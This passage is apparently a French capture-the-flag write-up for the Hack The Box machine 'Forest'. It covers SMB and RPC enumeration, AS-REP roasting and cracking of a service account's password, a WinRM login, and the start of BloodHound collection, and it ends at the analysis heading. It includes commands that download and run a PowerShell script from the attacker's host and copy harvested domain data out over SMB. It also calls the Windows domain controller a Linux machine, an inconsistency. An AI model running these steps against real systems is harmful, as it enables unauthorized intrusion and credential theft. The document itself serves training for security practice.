![Pic1](../img/forest1.PNG?raw=true) </br>

# Introduction

Forest est une machine linux dont l'adresse IP est 10.10.10.161.</br>
Compétences mises en oeuvre :
* Enumération des ports et services d'une machine distante.
* 
</br>

# Enumération initiale
Nous commençons par l'énumération des services et ports de la box avec nmap :
```bash
$ nmap -T4 -A 10.10.10.161
```
![Pic2](../img/admirer2.PNG?raw=true) </br>
Plusieurs ports ouverts, on peut déjà tenter une énumération des dossiers partagés par SMB :
```bash
$ smbmap -H 10.10.10.161
```
![Pic3](../img/admirer3.PNG?raw=true) </br>
Aucun partage dispo.</br>
On peut faire une énumération RPC avec rpcclient :
```bash
$ rpcclient -U "" -N 10.10.10.161
rpcclient > enumdomusers
```
![Pic4](../img/admirer4.PNG?raw=true) </br>
![Pic5](../img/admirer5.PNG?raw=true) </br>

# Obtenir un accès utilisateur
En ayant la liste des utilisateurs, nous pouvons tenter d'obtenir un ticket Kerberos pour chacun, cela fonctionnera que pour le compte
svc-alfresco :
```bash
$ GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/svc-alfresco
```
![Pic6](../img/admirer6.PNG?raw=true) </br>

Nous pouvons le cracker avec john :
```bash
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
![Pic7](../img/admirer7.PNG?raw=true) </br>
Nous pouvons alors nous connecter via le port 5985 avec Evil-WinRM et lire le user.txt :
```bash
$ evil-winrm -i 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
> cat ../Desktop/user.txt
```
![Pic8](../img/admirer8.PNG?raw=true) </br>

# Obtenir un accès administrateur
Nous allons utiliser l'outil Bloodhound, pour ce faire, il faut :
* Upload SharpHound sur la box et l'éxécuter.
* Envoyé le résultat de SharpHound vers l'attaquant.
* Charger le résultat dans Bloodhound.
* Analyser le résultat pour voir l'exploit.
* Exploitation.

## Upload SharpHound sur la box et l'éxécuter
Coté attaquant :
```bash
$ cp /opt/bloodhound/Collectors/SharpHound.ps1 ./
$ python3 -m http.server
```
Coté box :
```bash
> cd C:\Users\svc-alfresco\appdata\local\temp
> iex(new-object net.webclient).downloadstring("http://10.10.14.34:8000/SharpHound.ps1")
> dir
```
![Pic9](../img/admirer9.PNG?raw=true) </br>
Nous pouvons voir le fichier 20201124130216_BloodHound.zip qui contient le résultat des données récoltées par SharpHound.

## Envoyé le résultat de SharpHound vers l'attaquant
Coté attaquant :
```bash
$ smbserver.py share . -smb2support -username df -password df
```
![Pic10](../img/admirer11.PNG?raw=true) </br>
Coté box :
```bash
> net use \\10.10.14.34\share /u:df df
> copy 20201124130216_BloodHound.zip \\10.10.14.34\share\
> del 20201124130216_BloodHound.zip
> net use /d \\10.10.14.34\share
```
![Pic11](../img/admirer10.PNG?raw=true) </br>

## Charger le résultat dans Bloodhound